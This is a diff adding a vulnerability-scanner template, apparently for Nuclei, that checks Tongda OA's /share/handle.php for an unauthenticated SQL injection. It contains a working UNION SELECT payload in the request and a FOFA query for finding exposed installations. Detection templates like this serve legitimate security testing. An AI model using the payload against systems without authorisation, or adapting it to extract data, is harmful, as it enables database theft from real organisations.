@@ -1,0 +1,28 @@
+id: TongDa-22
+
+info:
+  name: 通达OA share存在前台SQL注入漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA /share/handle.php 存在前台SQL注入漏洞，攻击者无需登录可以利用漏洞获取数据库内敏感信息。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="通达OA网络智能办公系统"
+  tags: TongDa,OA,SQL注入漏洞
+request:
+  - raw:
+      - |
+        GET /share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20md5(1)--+ HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+        Host: {{RootURL}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: keep-alive
+          
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words: 
+          - "c4ca4238a0b923820dcc509a6f75849b"
